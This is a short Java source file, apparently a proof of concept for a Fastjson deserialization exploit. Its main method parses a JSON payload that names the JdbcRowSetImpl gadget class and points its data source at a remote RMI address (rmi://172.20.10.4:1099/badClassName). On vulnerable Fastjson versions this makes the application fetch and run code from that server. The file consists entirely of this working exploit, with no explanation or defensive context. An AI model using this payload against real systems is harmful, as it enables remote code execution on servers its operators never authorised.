package com.jndi;

import com.alibaba.fastjson.JSON;

public class JNDIClient {
    public static void main(String[] argv){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://172.20.10.4:1099/badClassName\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}